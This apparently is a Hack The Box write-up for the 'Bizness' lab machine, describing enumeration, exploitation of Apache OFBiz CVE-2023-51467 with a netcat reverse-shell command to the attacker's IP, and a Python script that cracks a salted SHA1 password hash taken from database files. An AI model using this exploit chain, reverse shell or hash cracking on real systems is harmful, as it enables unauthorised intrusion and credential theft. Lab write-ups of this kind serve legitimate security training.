![HTB - Bizness](/HTB/Bizness/box_logo.png)

# HTB Bizness - Writeup

[HTB website](https://app.hackthebox.com/machines/582)

<br>

## Enumeration

---

We start as usual: nmap. While waiting for the nmap results, I check the webpage because boxes usually have a webpage. The IP redirects me to `bizness.htb` so I add this to `/etc/hosts`. Nmap results:

![nmap results](/HTB/Bizness/nmap_results.JPG)

Since the box has a webpage, I start the directory enumeration as well (-k because the website has a self-signed certificate, -b302 because there is always a redirect to the home page even though the url does not exist): 

~~~bash
gobuster dir -u https://bizness.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -b 302,404
~~~

After a short while, a directory is found: `/control`:

![control500](/HTB/Bizness/control_500.JPG)

<br>

## Initial Foothold

---

This gives the information of the framework used for this website: Apache Ofbiz. The initial instinct is to research about well-known or recent vulnerabilities of this framework. After a quick Google search, we find a significant and very recent vulnerability: `CVE-2023-51467`. It says `Unauthenticated Remote Code Execution` so it is a fit for our case as well.

Finding a PoC exploit for this vulnerability was not easy. There were scripts that checks if the website is vulnerable, but they wouldn't work as exploits. After quite some research and trials, I found one that gives good results: [https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit)

(This script had a java error, but downloading ysoserial-all.jar from the internet fixed the error.)

First, I tried my payload as usual bash reverse shell, but it didn't work. After some tries of payloads, this one worked:

~~~bash
python3 exploit.py --url https://bizness.htb --cmd "nc <HTB_SELF_IP> 7777 -e /bin/bash"
~~~

<br>

## Privilege Escalation

---

Despite the "easy" tag of the box, privilege escalation was not easy at all. I tried numerous manual techniques with no results. I tried linpeas.sh with some interesting results. Before getting to the solution, here are some rabbit holes:

- A folder called "l" inside the home directory. It had a file called "python3" which had "set_uid=eip" capabilities. Later, it turned out that the folder was a leftover from QA testing, and HTB updated the box deleting that file.
- Writable "gradlew" script  inside the web framework folder, which were called by the system services on startup.
- SSH private and public keys for persistence. I tried cracking the passphrase of the private key with no results.

### The eventual solution:

linpeas.sh gave a clue about this but it took time for me to notice it among other hundreds of results. The web framework had a database. A derby database. I couldn't log in to the database but there were database files which might have valuable info. 

There were a quite number of files in /opt/ofbiz/runtime/data/derby/ofbiz/seg0, so checking one by one would take a lot of time. I tried a lot of regexes until I optimized to the following one: 

~~~bash
grep -ari -Po ".{0,40}password.{0,40}" .
~~~

The results of this command includes a hash:

~~~d
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
~~~

We can understand that it is a SHA1 hash and it has a salt "d". But the rest is not in a usual format. Moreover, in hashing process, passwords and salts can be used together in a lot of different ways. To be able to crack this hash, we need to understand how it was hashed. We need to copy the same process that is followed by Ofbiz framework to our wordlist (it is an open-source project so it should be easy to find out what kind of algorithm they use).

### Hashing our Rockyou

First of all, we need to find their hashing algorithm. From their documentation ([link](https://nightlies.apache.org/ofbiz/stable/javadoc/org/apache/ofbiz/base/crypto/HashCrypt.html)), it is possible to identify the name of the algorithms. But the source code is not on their website directly. So, I went for the source code inside the box. The path is the same as in the website. This is the base hashing algorithm:

![ofbiz hashing](/HTB/Bizness/ofbiz_hashing.JPG)

I rewrote the hashing in Python to be able to hash the words in our wordlist and find the password:

```python
import hashlib
import base64


def ofbiz_hash(passwd):
    newHash = hashlib.new("SHA1")
    newHash.update("d".encode('utf-8'))
    newHash.update(passwd.encode('utf-8'))
    result = newHash.digest()
    return base64.urlsafe_b64encode(result).decode('utf-8').replace('+', '.')[:-1]


wordlist = "rockyou.txt"
with open(wordlist, 'r', encoding='latin-1') as passwords:
    print(f"Wordlist loaded: {wordlist}")
    for password in passwords:
        if ofbiz_hash(password) == "uP0_QaVBpDWFeo8-dRzDqRwXQ2I":
            print(f"Password found: {password}")
            break
```

With the password found, we can:

~~~bash
su root
cat /root/root.txt
~~~
